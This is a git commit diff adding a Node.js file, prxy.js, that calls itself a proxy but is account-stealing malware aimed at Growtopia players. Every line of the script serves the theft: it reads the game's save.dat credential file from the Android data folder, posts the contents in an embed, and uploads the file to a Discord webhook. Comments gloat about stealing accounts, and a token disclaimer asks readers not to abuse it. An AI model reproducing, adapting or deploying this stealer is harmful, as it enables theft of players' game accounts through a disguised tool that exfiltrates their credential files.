8d7e8376ba6d9b4ecd3fdc3f52236098538d493d
DiazKun <68154504+DiazKun@users.noreply.github.com>
2022-04-07 18:00:42 +0700

    Add files via upload

---
+++ prxy.js
@@ -0,0 +1,44 @@
+/*** Created on Github accounts named FrenzY8 ***/
+/*** 
+- Just a seconds. please read.
+Do not use for Abuse Activities. 
+We will not be held responsible for anything that happens to the Victim, the Perpetrator.
+This code is only distributed and is not recommended to be used TO PUBLIC (including-abuse)
+Only fools trade(buy/sell) this Code.
+- All risks are in your hands.
+***/
+
+/*** Get Started ***/
+console.log("Get ready.. we'll stole a save.data :D")
+const os = require('os');
+const { 
+    Webhook, 
+    MessageBuilder 
+} = require('discord-webhook-node');
+const yourhook = new Webhook('your-faking-noob-webhook'); // Noob webhooks.
+const fs = require('fs');
+
+// Lets start:D
+function yazproxy () {
+    const path = `${os.homedir()}/Android/Data/com.rtsoft.growtopia/files/save.dat`
+    if (fs.existsSync(path)) { // Detect the path. if they exists or nop. why? cause some ppl are SMART.
+    console.log("[DIAZ-PROXY] Started Proxy")
+    // read it first
+    const hasil = fs.readFileSync(path,'utf8') // Results of reading the data...
+    const noobembed = new MessageBuilder() // Make new embed
+    .setAuthor("New Account h;ve been stolen.", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
+    .setURL('https://github.com/FrenzY8') // URI
+    .setDescription("```ini\n" + hasil + "\n```")
+    .setFooter("proxy has been started", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
+    //send embed.
+    yourhook.send(noobembed)
+    //then files.
+    yourhook.sendFile(path);
+    console.log("Lol... imagine noob get stolen! btw the files h;ve been sended to your webhook.") // Send the notify
+  } else {
+      console.log("well.. we didnot found any save dat.")
+  }
+}
+
+yazproxy();
+
